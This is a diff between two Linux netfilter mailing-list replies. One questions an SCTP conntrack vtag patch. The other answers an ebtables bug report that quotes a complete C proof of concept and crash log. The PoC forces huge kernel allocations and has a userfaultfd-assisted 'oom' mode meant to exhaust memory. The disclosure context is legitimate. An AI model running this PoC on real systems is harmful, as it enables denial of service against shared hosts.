@@ -1,51 +1,44 @@
 Received: from mail.netfilter.org (mail.netfilter.org [217.70.190.124])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B0CE54734C4;
-	Tue, 28 Jul 2026 19:26:42 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8EB1A345ED9
+	for <netfilter-devel@vger.kernel.org>; Tue, 28 Jul 2026 19:35:57 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=217.70.190.124
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785266804; cv=none; b=JPoY08Zui2671KjXRGWTJNheqnXnd1ywWSFuzQUAATDorti0p2rUREGhxGw2xl6cAmHxgO7mAojfEOGHj/G4qhZ/FSAzyzUtzZ/L13CsMVXpigX74WzYvDNI0cnUJlz+cUSA5E4Kqa3ISLLArgNGt7rIgnEvnXak4SyF4FhsCQg=
+	t=1785267360; cv=none; b=nw73SEUq2FPo2M6swcPqWhmUJFQo4TQWNmyEfeZxaKkfV183P096NVbE8DgYtbWxOnf996M06pDGAlcVYRufGxBE5Q+qTjsMcgU/zq5t9aTGz6Wx4RR1HGlGeyp9uRcrAgefffNGancgYfGbFWUcK5Z1aZANHRZVVbE42OBszsA=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785266804; c=relaxed/simple;
-	bh=86K6vg15VfD9OXa2/xauBqFIPOM5uTHnBK6Jx4CCyKc=;
+	s=arc-20240116; t=1785267360; c=relaxed/simple;
+	bh=QCgsaq+DuuoGBRtbitdyyBB4io+MoejFCg8Jak6w/6I=;
 	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=bLQfK1/ahuWFxco5vsw3NDsDUCuWuplNuNuKNvkL6GLa1Fq1gY1+tYiqIcKK4auXTGgHLFlInUU2p3g7Ii9oJfXW1yv3mBngcQuNjT6168KDPiTXXsXaARQSyVNUWsReuQUhRM5HeDHVejthZKOAJVcigMxwDbL5+O3Z1rgxjY0=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=netfilter.org; spf=pass smtp.mailfrom=netfilter.org; dkim=pass (2048-bit key) header.d=netfilter.org header.i=@netfilter.org header.b=CoS//Fk2; arc=none smtp.client-ip=217.70.190.124
+	 Content-Type:Content-Disposition:In-Reply-To; b=bL12UjzRLKgHk/fgFubGH/dXqLcEr3ueX5De5QVrWcqyBFWMmM9B6fcX6MsbWKYRWBtd37TAkeFiOk4tGxYvrMd9dcCU7j3c3aUQHm9nzYG74+b3Rg3phL90YdDaIdBFl8KxwothMIYYItGs/DO8DspX17UO4CehoWvkoJ5jjBo=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=netfilter.org; spf=pass smtp.mailfrom=netfilter.org; dkim=pass (2048-bit key) header.d=netfilter.org header.i=@netfilter.org header.b=ZR9gSNXz; arc=none smtp.client-ip=217.70.190.124
 Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=netfilter.org
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=netfilter.org
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=netfilter.org header.i=@netfilter.org header.b="CoS//Fk2"
+	dkim=pass (2048-bit key) header.d=netfilter.org header.i=@netfilter.org header.b="ZR9gSNXz"
 Received: from netfilter.org (mail-agni [217.70.190.124])
-	by mail.netfilter.org (Postfix) with UTF8SMTPSA id A93E360196;
-	Tue, 28 Jul 2026 21:26:39 +0200 (CEST)
+	by mail.netfilter.org (Postfix) with UTF8SMTPSA id BEEEC601A1;
+	Tue, 28 Jul 2026 21:35:54 +0200 (CEST)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=netfilter.org;
-	s=2025; t=1785266799;
-	bh=MEECRbHkWBREqJmphTODP5tOHFNRtm4Szv75Afqgxo0=;
+	s=2025; t=1785267354;
+	bh=a8QW8i6NH0FvoHBxtgeAo3lW8LYiOUzReKowwSjbhgw=;
 	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
-	b=CoS//Fk2N71KPTPMbUEuwoTkOr43RLuYC7r27LdeGxw0qAjlufRTZS/X2DJGpral/
-	 +7ZrDfmoDJ5MYOvHh+Ud4ZHPD/AjyLvpm7sVh2Nfk1MVYN5U7zQ8/eJ8ChzDalZn8V
-	 Z8BDuXkZYmb54H7UMxdDCQZe96Rn7mTga6kayghzBbyulDg7AXrpBw+TG1vcsapU3K
-	 RusjR6eGUgKZ8M5Ycm7gesBBLEce55f5jB40/DoPTzWkkCbui43zbMO2UOc1E6YbNz
-	 /yHzyXkX/zdS1GwcOjrLS6STNmEmJ4E1vDn8yBhLixQijrSr5G57UifC8E0RbCFSTX
-	 XEkPSCLWFK2lg==
-Date: Tue, 28 Jul 2026 21:26:37 +0200
+	b=ZR9gSNXzgWKl9NcECdx6udtMP0E9WBQxFG63mfFhm39U0VyvJ0vDBXVC8AyRJSNa5
+	 dXtwfyia4Ky9V85MNSEqLdnMX5KUC3iiYzWsXKMooa7U3gC2J3gIrmWSPMSlD4ME+u
+	 rV3ZO1SNLzaYo5NE76fOThTN+J+rVqTrOIbonmXaxj97UGkS2kylO9NkYtS9xZ9OhD
+	 I549tNs6SnGS51Q0oZNidAxmccm9dm71FbPt0gv6aHbbdLjuaQb1tRb7LecCmTXT3w
+	 N8eEb28erOikCv/lzrUtnYH2R0hpBCzlgBgS2QaA9uPgmtuPKhERV8LMRX9KB/u5ah
+	 3a55V+7aA/oPg==
+Date: Tue, 28 Jul 2026 21:35:52 +0200
 From: Pablo Neira Ayuso <pablo@netfilter.org>
-To: Yizhou Zhao <zhaoyz24@mails.tsinghua.edu.cn>
-Cc: netfilter-devel@vger.kernel.org, Florian Westphal <fw@strlen.de>,
-	Phil Sutter <phil@nwl.cc>, "David S. Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@google.com>,
-	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>,
-	Simon Horman <horms@kernel.org>, coreteam@netfilter.org,
-	netdev@vger.kernel.org, linux-kernel@vger.kernel.org,
-	stable@vger.kernel.org,
-	Yuxiang Yang <yangyx22@mails.tsinghua.edu.cn>,
-	Ao Wang <wangao@seu.edu.cn>, Xuewei Feng <fengxw06@126.com>,
-	Qi Li <qli01@tsinghua.edu.cn>, Ke Xu <xuke@tsinghua.edu.cn>
-Subject: Re: [PATCH nf] netfilter: conntrack: sctp: verify vtag before state
- changes
-Message-ID: <amkCbQ1UDRKcZBez@chamomile>
-References: <20260728073507.30635-1-zhaoyz24@mails.tsinghua.edu.cn>
+To: Ren Wei <enjou1224z@gmail.com>
+Cc: netfilter-devel@vger.kernel.org, bridge@lists.linux.dev, fw@strlen.de,
+	phil@nwl.cc, razor@blackwall.org, idosch@nvidia.com,
+	vega@nebusec.ai, zihanx@nebusec.ai
+Subject: Re: [PATCH nf 0/1] netfilter: ebtables: avoid unbounded counter
+ allocations
+Message-ID: <amkEmMRrTkx3YU1t@chamomile>
+References: <cover.1785131981.git.zihanx@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: netfilter-devel@vger.kernel.org
 List-Id: <netfilter-devel.vger.kernel.org>
@@ -54,79 +47,619 @@ List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Type: text/plain; charset=utf-8
 Content-Disposition: inline
-In-Reply-To: <20260728073507.30635-1-zhaoyz24@mails.tsinghua.edu.cn>
+In-Reply-To: <cover.1785131981.git.zihanx@nebusec.ai>
 
 Hi,
 
-On Tue, Jul 28, 2026 at 03:35:06PM +0800, Yizhou Zhao wrote:
-> The packet-wide vtag check in nf_conntrack_sctp_packet() is skipped when
-> the bundle map contains any chunk type with special vtag handling.  The
-> per-chunk path re-checks INIT, ABORT, SHUTDOWN_COMPLETE, and
-> COOKIE_ECHO, but other state-changing chunks still fall through to
-> sctp_new_state() without validating sh->vtag.
+On Tue, Jul 28, 2026 at 02:09:43AM +0800, Ren Wei wrote:
+> From: Zihan Xi <zihanx@nebusec.ai>
 > 
-> This lets a wrong-vtag packet bundle HEARTBEAT with COOKIE_ACK, ERROR,
-> SHUTDOWN, or SHUTDOWN_ACK and still advance conntrack state.  That can
-> desynchronize conntrack from the real SCTP association and cause denial
-> of service for SCTP traffic behind a stateful firewall.
-
-Are you assuming a specific policy in place? The connection tracking
-does not police packets, it just provides tracking.
-
-Can you provide a more specific scenario?
-
-We are seeing several reports related to the connection tracking from
-your university lately.
-
-> Check sh->vtag before processing those chunks when conntrack already
-> knows the expected direction vtag.  This keeps the existing
-> HEARTBEAT/HEARTBEAT_ACK learning and connection-reuse behavior for the
-> `vtag == 0` cases.
-
-Proposed patches to hardening the connection tracking state machine
-should be targeted at nf-next.
-
-Thanks.
-
-> Fixes: 9fb9cbb1082d ("[NETFILTER]: Add nf_conntrack subsystem.")
-> Cc: stable@vger.kernel.org
-> Reported-by: Yizhou Zhao <zhaoyz24@mails.tsinghua.edu.cn>
-> Reported-by: Yuxiang Yang <yangyx22@mails.tsinghua.edu.cn>
-> Reported-by: Ao Wang <wangao@seu.edu.cn>
-> Reported-by: Xuewei Feng <fengxw06@126.com>
-> Reported-by: Qi Li <qli01@tsinghua.edu.cn>
-> Reported-by: Ke Xu <xuke@tsinghua.edu.cn>
-> Assisted-by: Claude-Code:GLM-5.2
-> Signed-off-by: Yizhou Zhao <zhaoyz24@mails.tsinghua.edu.cn>
-> ---
->  net/netfilter/nf_conntrack_proto_sctp.c | 14 +++++++++++---
->  1 file changed, 11 insertions(+), 3 deletions(-)
+> Hi Linux kernel maintainers,
 > 
-> diff --git a/net/netfilter/nf_conntrack_proto_sctp.c b/net/netfilter/nf_conntrack_proto_sctp.c
-> index 7e10fa65cbdd..9978ecd05b1e 100644
-> --- a/net/netfilter/nf_conntrack_proto_sctp.c
-> +++ b/net/netfilter/nf_conntrack_proto_sctp.c
-> @@ -407,9 +407,17 @@ int nf_conntrack_sctp_packet(struct nf_conn *ct,
->  			/* (D) vtag must be same as init_vtag as found in INIT_ACK */
->  			if (sh->vtag != ct->proto.sctp.vtag[dir])
->  				goto out_unlock;
-> -		} else if (sch->type == SCTP_CID_COOKIE_ACK) {
-> -			ct->proto.sctp.init[dir] = 0;
-> -			ct->proto.sctp.init[!dir] = 0;
-> +		} else if (sch->type == SCTP_CID_COOKIE_ACK ||
-> +			   sch->type == SCTP_CID_ERROR ||
-> +			   sch->type == SCTP_CID_SHUTDOWN ||
-> +			   sch->type == SCTP_CID_SHUTDOWN_ACK) {
-> +			if (ct->proto.sctp.vtag[dir] &&
-> +			    sh->vtag != ct->proto.sctp.vtag[dir])
-> +				goto out_unlock;
-> +			if (sch->type == SCTP_CID_COOKIE_ACK) {
-> +				ct->proto.sctp.init[dir] = 0;
-> +				ct->proto.sctp.init[!dir] = 0;
-> +			}
->  		} else if (sch->type == SCTP_CID_HEARTBEAT) {
->  			if (ct->proto.sctp.vtag[dir] == 0) {
->  				pr_debug("Setting %d vtag %x for dir %d\n", sch->type, sh->vtag, dir);
+> We found and validated a issue in net/bridge/netfilter/ebtables.c. The bug is reachable by a
+> non-root user via user and net namespace.
+> We've tested it, and it should not affect any other functionality.
+> 
+> We will provide detailed information about the bug
+> in this email, along with a PoC to trigger it.
+> 
+> ---- details below ----
+> 
+> Bug details:
+> 
+> EBT_SO_SET_COUNTERS copies only a fixed struct ebt_replace header before it
+> allocates a temporary counter array. The user-controlled num_counters field is
+> used for that allocation before the target table is looked up and before it can
+> be compared with the table's real nentries value. A user with CAP_NET_ADMIN in
+> a user/net namespace can therefore request a very large allocation against any
+> table name, even a non-existent one.
+
+You could just create a very large well-formed table with ebtables too?
+
+This is not a crash, just a very large allocation.
+
+[    1.577403] poc: vmalloc error: size 2147483520, exceeds total pages, mode:0xcc0(GFP_KERNEL), nodemask=(null),cpuset=/,mems_allowed=0
+
+> EBT_SO_SET_ENTRIES has the same root cause in do_replace_finish(). After the
+> replacement blob is copied and validated, do_replace_finish() used
+> repl->num_counters to allocate counterstmp before find_table_lock() and before
+> checking it against t->private->nentries. That path can trigger the same
+> unbounded allocation before the kernel knows whether the table exists or how
+> many counters are valid for it.
+> 
+> Recent public patches on July 2, 2026 and July 4, 2026 also tightened
+> bounds for do_replace()/do_replace_finish() and do_update_counters()
+> individually, but the underlying issue is the same in both paths:
+> temporary counter arrays are allocated from user-controlled counts before
+> the kernel has resolved the real table and validated the real nentries
+> value.
+> 
+> Fix this by moving both temporary counter allocations after find_table_lock()
+> and after the num_counters-to-nentries validation. Invalid table names or
+> counter counts now fail with the existing semantic errors instead of first
+> attempting a large allocation. This is a setsockopt control-plane trigger, not
+> a packet-driven protocol-state trigger, so packetdrill cannot express the key
+> EBT_SO_SET_COUNTERS/EBT_SO_SET_ENTRIES inputs; the reproducer uses setsockopt()
+> directly.
+> 
+> Reproducer:
+> 
+>     gcc -O2 -static -o poc poc.c
+>     unshare -Urn ./poc
+> 
+> We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+> 
+> ------BEGIN poc.c------
+> #define _GNU_SOURCE
+> 
+> #include <errno.h>
+> #include <fcntl.h>
+> #include <inttypes.h>
+> #include <poll.h>
+> #include <pthread.h>
+> #include <signal.h>
+> #include <stdbool.h>
+> #include <stdint.h>
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <sys/ioctl.h>
+> #include <sys/mman.h>
+> #include <sys/socket.h>
+> #include <sys/syscall.h>
+> #include <sys/types.h>
+> #include <sys/wait.h>
+> #include <unistd.h>
+> 
+> #include <linux/userfaultfd.h>
+> 
+> #ifndef O_CLOEXEC
+> #define O_CLOEXEC 02000000
+> #endif
+> 
+> #define SOL_IP 0
+> 
+> #define EBT_TABLE_MAXNAMELEN 32
+> #define EBT_BASE_CTL 128
+> #define EBT_SO_SET_ENTRIES (EBT_BASE_CTL)
+> #define EBT_SO_SET_COUNTERS (EBT_SO_SET_ENTRIES + 1)
+> #define EBT_SO_GET_INFO (EBT_BASE_CTL)
+> #define EBT_SO_GET_ENTRIES (EBT_SO_GET_INFO + 1)
+> 
+> #define NF_BR_NUMHOOKS 6
+> 
+> struct ebt_counter {
+> 	uint64_t pcnt;
+> 	uint64_t bcnt;
+> };
+> 
+> struct ebt_replace {
+> 	char name[EBT_TABLE_MAXNAMELEN];
+> 	unsigned int valid_hooks;
+> 	unsigned int nentries;
+> 	unsigned int entries_size;
+> 	void *hook_entry[NF_BR_NUMHOOKS];
+> 	unsigned int num_counters;
+> 	struct ebt_counter *counters;
+> 	char *entries;
+> };
+> 
+> #define HUGE_NUM_COUNTERS 134217720U
+> #define HUGE_COUNTERS_LEN ((unsigned int)(sizeof(struct ebt_replace) + \
+> 					  HUGE_NUM_COUNTERS * sizeof(struct ebt_counter)))
+> #define TINY_ENTRIES_SIZE 1U
+> #define HUGE_REPLACE_LEN ((unsigned int)(sizeof(struct ebt_replace) + \
+> 					 TINY_ENTRIES_SIZE))
+> 
+> _Static_assert(sizeof(struct ebt_replace) == 120, "unexpected ebt_replace size");
+> _Static_assert(HUGE_COUNTERS_LEN == 2147483640U,
+> 	       "unexpected huge setsockopt length");
+> 
+> struct table_info {
+> 	unsigned int nentries;
+> 	unsigned int entries_size;
+> 	unsigned int valid_hooks;
+> };
+> 
+> struct blocker_state {
+> 	int uffd;
+> 	long page_size;
+> 	void *fault_page;
+> 	char *copy_page;
+> 	volatile sig_atomic_t release_fault;
+> 	volatile sig_atomic_t fault_seen;
+> 	volatile sig_atomic_t blocker_started;
+> 	struct ebt_replace *req;
+> 	socklen_t optlen;
+> 	int blocker_ret;
+> 	int blocker_errno;
+> };
+> 
+> static void fatal(const char *what)
+> {
+> 	perror(what);
+> 	exit(EXIT_FAILURE);
+> }
+> 
+> static int make_inet_socket(void)
+> {
+> 	int fd = socket(AF_INET, SOCK_STREAM, 0);
+> 
+> 	if (fd < 0)
+> 		fatal("socket(AF_INET, SOCK_STREAM)");
+> 	return fd;
+> }
+> 
+> static void get_table_info(const char *name, struct table_info *info)
+> {
+> 	struct ebt_replace req;
+> 	socklen_t len = sizeof(req);
+> 	int fd = make_inet_socket();
+> 
+> 	memset(&req, 0, sizeof(req));
+> 	snprintf(req.name, sizeof(req.name), "%s", name);
+> 
+> 	if (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &req, &len) != 0)
+> 		fatal("getsockopt(EBT_SO_GET_INFO)");
+> 
+> 	close(fd);
+> 
+> 	info->nentries = req.nentries;
+> 	info->entries_size = req.entries_size;
+> 	info->valid_hooks = req.valid_hooks;
+> }
+> 
+> static int do_huge_update(const char *name, bool log_result)
+> {
+> 	struct ebt_replace req;
+> 	int fd = make_inet_socket();
+> 	int saved_errno;
+> 	int ret;
+> 
+> 	memset(&req, 0, sizeof(req));
+> 	snprintf(req.name, sizeof(req.name), "%s", name);
+> 	req.num_counters = HUGE_NUM_COUNTERS;
+> 	req.counters = (struct ebt_counter *)0x10000;
+> 
+> 	errno = 0;
+> 	ret = setsockopt(fd, SOL_IP, EBT_SO_SET_COUNTERS, &req,
+> 			 HUGE_COUNTERS_LEN);
+> 	saved_errno = errno;
+> 	close(fd);
+> 
+> 	if (log_result)
+> 		fprintf(stderr,
+> 			"[worker] SET_COUNTERS name=%s len=%u num_counters=%u -> ret=%d errno=%d (%s)\n",
+> 			name, HUGE_COUNTERS_LEN, HUGE_NUM_COUNTERS, ret,
+> 			saved_errno, strerror(saved_errno));
+> 
+> 	errno = saved_errno;
+> 	return ret;
+> }
+> 
+> static int do_huge_replace(const char *name, bool log_result)
+> {
+> 	struct ebt_replace req;
+> 	char tiny_entries[TINY_ENTRIES_SIZE] = {0};
+> 	int fd = make_inet_socket();
+> 	int saved_errno;
+> 	int ret;
+> 
+> 	memset(&req, 0, sizeof(req));
+> 	snprintf(req.name, sizeof(req.name), "%s", name);
+> 	req.entries_size = TINY_ENTRIES_SIZE;
+> 	req.entries = tiny_entries;
+> 	req.num_counters = HUGE_NUM_COUNTERS;
+> 	req.counters = (struct ebt_counter *)0x10000;
+> 
+> 	errno = 0;
+> 	ret = setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &req,
+> 			 HUGE_REPLACE_LEN);
+> 	saved_errno = errno;
+> 	close(fd);
+> 
+> 	if (log_result)
+> 		fprintf(stderr,
+> 			"[worker] SET_ENTRIES name=%s len=%u entries_size=%u num_counters=%u allocation=%zu -> ret=%d errno=%d (%s)\n",
+> 			name, HUGE_REPLACE_LEN, TINY_ENTRIES_SIZE,
+> 			HUGE_NUM_COUNTERS,
+> 			(size_t)HUGE_NUM_COUNTERS * sizeof(struct ebt_counter),
+> 			ret, saved_errno, strerror(saved_errno));
+> 
+> 	errno = saved_errno;
+> 	return ret;
+> }
+> 
+> static int open_userfaultfd(void)
+> {
+> 	struct uffdio_api api;
+> 	int fd;
+> 
+> 	fd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+> 	if (fd < 0) {
+> 		fd = open("/dev/userfaultfd", O_RDWR | O_CLOEXEC | O_NONBLOCK);
+> 		if (fd < 0)
+> 			fatal("userfaultfd/open(/dev/userfaultfd)");
+> 		fd = ioctl(fd, USERFAULTFD_IOC_NEW, O_CLOEXEC | O_NONBLOCK);
+> 		if (fd < 0)
+> 			fatal("USERFAULTFD_IOC_NEW");
+> 	}
+> 
+> 	memset(&api, 0, sizeof(api));
+> 	api.api = UFFD_API;
+> 	if (ioctl(fd, UFFDIO_API, &api) < 0)
+> 		fatal("UFFDIO_API");
+> 
+> 	return fd;
+> }
+> 
+> static void register_missing_page(struct blocker_state *st)
+> {
+> 	struct uffdio_register reg;
+> 
+> 	st->fault_page = mmap(NULL, st->page_size, PROT_READ | PROT_WRITE,
+> 			    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+> 	if (st->fault_page == MAP_FAILED)
+> 		fatal("mmap(fault_page)");
+> 	if (munmap(st->fault_page, st->page_size) != 0)
+> 		fatal("munmap(fault_page)");
+> 
+> 	st->copy_page = calloc(1, (size_t)st->page_size);
+> 	if (!st->copy_page)
+> 		fatal("calloc(copy_page)");
+> 
+> 	memset(&reg, 0, sizeof(reg));
+> 	reg.range.start = (unsigned long)st->fault_page;
+> 	reg.range.len = (unsigned long)st->page_size;
+> 	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
+> 	if (ioctl(st->uffd, UFFDIO_REGISTER, &reg) != 0)
+> 		fatal("UFFDIO_REGISTER");
+> }
+> 
+> static void *uffd_handler_thread(void *arg)
+> {
+> 	struct blocker_state *st = arg;
+> 
+> 	while (!st->release_fault) {
+> 		struct uffd_msg msg;
+> 		struct pollfd pfd = { .fd = st->uffd, .events = POLLIN };
+> 		int pr = poll(&pfd, 1, 100);
+> 
+> 		if (pr < 0) {
+> 			if (errno == EINTR)
+> 				continue;
+> 			fatal("poll(userfaultfd)");
+> 		}
+> 		if (pr == 0)
+> 			continue;
+> 		if (read(st->uffd, &msg, sizeof(msg)) != sizeof(msg))
+> 			fatal("read(userfaultfd)");
+> 		if (msg.event != UFFD_EVENT_PAGEFAULT)
+> 			continue;
+> 
+> 		st->fault_seen = 1;
+> 		fprintf(stderr,
+> 			"[blocker] userfaultfd trapped kernel copy_to_user at address 0x%llx\n",
+> 			(unsigned long long)msg.arg.pagefault.address);
+> 
+> 		while (!st->release_fault)
+> 			usleep(10000);
+> 
+> 		struct uffdio_copy copy;
+> 		memset(&copy, 0, sizeof(copy));
+> 		copy.src = (unsigned long)st->copy_page;
+> 		copy.dst = (unsigned long)st->fault_page;
+> 		copy.len = (unsigned long)st->page_size;
+> 		if (ioctl(st->uffd, UFFDIO_COPY, &copy) != 0)
+> 			fatal("UFFDIO_COPY");
+> 		fprintf(stderr, "[blocker] released the trapped GET_ENTRIES fault\n");
+> 		break;
+> 	}
+> 
+> 	return NULL;
+> }
+> 
+> static void *blocker_thread(void *arg)
+> {
+> 	struct blocker_state *st = arg;
+> 	int fd = make_inet_socket();
+> 
+> 	st->blocker_started = 1;
+> 	errno = 0;
+> 	st->blocker_ret = getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES,
+> 				       st->req, &st->optlen);
+> 	st->blocker_errno = errno;
+> 	fprintf(stderr,
+> 		"[blocker] getsockopt(EBT_SO_GET_ENTRIES) returned ret=%d errno=%d (%s)\n",
+> 		st->blocker_ret, st->blocker_errno, strerror(st->blocker_errno));
+> 	close(fd);
+> 	return NULL;
+> }
+> 
+> static uint64_t read_meminfo_kb(const char *key)
+> {
+> 	char name[128];
+> 	uint64_t value;
+> 	FILE *f = fopen("/proc/meminfo", "r");
+> 
+> 	if (!f)
+> 		fatal("fopen(/proc/meminfo)");
+> 	while (fscanf(f, "%127s %" SCNu64 " kB", name, &value) == 2) {
+> 		name[strcspn(name, ":")] = '\0';
+> 		if (strcmp(name, key) == 0) {
+> 			fclose(f);
+> 			return value;
+> 		}
+> 	}
+> 	fclose(f);
+> 	fatal("read_meminfo_kb");
+> 	return 0;
+> }
+> 
+> static void kill_children(pid_t *children, int n)
+> {
+> 	int i;
+> 
+> 	for (i = 0; i < n; i++)
+> 		if (children[i] > 0)
+> 			kill(children[i], SIGKILL);
+> }
+> 
+> static void reap_children(pid_t *children, int n)
+> {
+> 	int i;
+> 
+> 	for (i = 0; i < n; i++)
+> 		if (children[i] > 0)
+> 			waitpid(children[i], NULL, 0);
+> }
+> 
+> static void run_oom_mode(int workers, int timeout_sec)
+> {
+> 	struct blocker_state st;
+> 	struct table_info filter;
+> 	pthread_t blocker_tid;
+> 	pthread_t uffd_tid;
+> 	pid_t *children;
+> 	uint64_t mem_before, mem_after;
+> 	int i;
+> 
+> 	if (workers <= 0)
+> 		fatal("workers must be positive");
+> 
+> 	memset(&st, 0, sizeof(st));
+> 	get_table_info("filter", &filter);
+> 
+> 	fprintf(stderr,
+> 		"[setup] filter table: nentries=%u entries_size=%u valid_hooks=0x%x\n",
+> 		filter.nentries, filter.entries_size, filter.valid_hooks);
+> 	fprintf(stderr,
+> 		"[setup] huge update request: len=%u num_counters=%u allocation=%zu bytes\n",
+> 		HUGE_COUNTERS_LEN, HUGE_NUM_COUNTERS,
+> 		(size_t)HUGE_NUM_COUNTERS * sizeof(struct ebt_counter));
+> 
+> 	st.page_size = sysconf(_SC_PAGESIZE);
+> 	if (st.page_size <= 0)
+> 		fatal("sysconf(_SC_PAGESIZE)");
+> 
+> 	st.uffd = open_userfaultfd();
+> 	register_missing_page(&st);
+> 
+> 	st.req = calloc(1, sizeof(*st.req));
+> 	if (!st.req)
+> 		fatal("calloc(blocker request)");
+> 
+> 	snprintf(st.req->name, sizeof(st.req->name), "%s", "filter");
+> 	st.req->nentries = filter.nentries;
+> 	st.req->entries_size = filter.entries_size;
+> 	st.req->num_counters = 0;
+> 	st.req->entries = st.fault_page;
+> 	st.optlen = sizeof(*st.req) + filter.entries_size;
+> 
+> 	if (pthread_create(&uffd_tid, NULL, uffd_handler_thread, &st) != 0)
+> 		fatal("pthread_create(uffd)");
+> 	if (pthread_create(&blocker_tid, NULL, blocker_thread, &st) != 0)
+> 		fatal("pthread_create(blocker)");
+> 
+> 	for (i = 0; i < timeout_sec * 100; i++) {
+> 		if (st.fault_seen)
+> 			break;
+> 		usleep(10000);
+> 	}
+> 	if (!st.fault_seen) {
+> 		fprintf(stderr,
+> 			"[setup] blocker did not hit the userfaultfd trap within %d seconds\n",
+> 			timeout_sec);
+> 		st.release_fault = 1;
+> 		pthread_join(blocker_tid, NULL);
+> 		pthread_join(uffd_tid, NULL);
+> 		exit(EXIT_FAILURE);
+> 	}
+> 
+> 	mem_before = read_meminfo_kb("MemAvailable");
+> 	fprintf(stderr, "[state] MemAvailable before workers: %" PRIu64 " kB\n",
+> 		mem_before);
+> 
+> 	children = calloc((size_t)workers, sizeof(*children));
+> 	if (!children)
+> 		fatal("calloc(children)");
+> 
+> 	for (i = 0; i < workers; i++) {
+> 		pid_t pid = fork();
+> 
+> 		if (pid < 0)
+> 			fatal("fork");
+> 		if (pid == 0) {
+> 			do_huge_update("bogus", true);
+> 			_exit(EXIT_SUCCESS);
+> 		}
+> 		children[i] = pid;
+> 		fprintf(stderr, "[parent] spawned worker pid=%d\n", pid);
+> 	}
+> 
+> 	sleep(2);
+> 	mem_after = read_meminfo_kb("MemAvailable");
+> 	fprintf(stderr,
+> 		"[state] MemAvailable after workers: %" PRIu64 " kB (delta=%" PRIi64 " kB)\n",
+> 		mem_after, (int64_t)mem_after - (int64_t)mem_before);
+> 	fprintf(stderr, "[state] waiting up to %d seconds for an OOM-induced crash\n",
+> 		timeout_sec);
+> 
+> 	sleep(timeout_sec);
+> 
+> 	fprintf(stderr, "[cleanup] timeout expired without a kernel panic; releasing blocker\n");
+> 	st.release_fault = 1;
+> 	pthread_join(blocker_tid, NULL);
+> 	pthread_join(uffd_tid, NULL);
+> 	kill_children(children, workers);
+> 	reap_children(children, workers);
+> 	free(children);
+> }
+> 
+> static void usage(const char *prog)
+> {
+> 	fprintf(stderr,
+> 		"Usage:\n"
+> 		"  %s counters [table]\n"
+> 		"  %s replace [table]\n"
+> 		"  %s oom [workers] [timeout_sec]\n",
+> 		prog, prog, prog);
+> }
+> 
+> int main(int argc, char **argv)
+> {
+> 	if (argc < 2) {
+> 		do_huge_update("bogus", true);
+> 		do_huge_replace("bogus", true);
+> 		return EXIT_FAILURE;
+> 	}
+> 
+> 	if (strcmp(argv[1], "counters") == 0) {
+> 		const char *name = (argc >= 3) ? argv[2] : "bogus";
+> 		int ret = do_huge_update(name, true);
+> 
+> 		return (ret == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
+> 	}
+> 
+> 	if (strcmp(argv[1], "replace") == 0) {
+> 		const char *name = (argc >= 3) ? argv[2] : "bogus";
+> 		int ret = do_huge_replace(name, true);
+> 
+> 		return (ret == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
+> 	}
+> 
+> 	if (strcmp(argv[1], "oom") == 0) {
+> 		int workers = (argc >= 3) ? atoi(argv[2]) : 3;
+> 		int timeout_sec = (argc >= 4) ? atoi(argv[3]) : 10;
+> 
+> 		run_oom_mode(workers, timeout_sec);
+> 		return EXIT_SUCCESS;
+> 	}
+> 
+> 	usage(argv[0]);
+> 	return EXIT_FAILURE;
+> }
+> ------END poc.c--------
+> 
+> ----BEGIN crash log----
+> EBT_SO_SET_COUNTERS path:
+> [    1.577403] poc: vmalloc error: size 2147483520, exceeds total pages, mode:0xcc0(GFP_KERNEL), nodemask=(null),cpuset=/,mems_allowed=0
+> [    1.578954] CPU: 1 UID: 0 PID: 64 Comm: poc Not tainted 7.2.0-rc4-00390-g743916aa8e8c #4 PREEMPT(lazy) 
+> [    1.579038] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+> [    1.579145] Call Trace:
+> [    1.579555]  <TASK>
+> [    1.579713]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
+> [    1.579934]  warn_alloc (mm/page_alloc.c:4023)
+> [    1.579949]  __vmalloc_node_range_noprof (mm/vmalloc.c:4019)
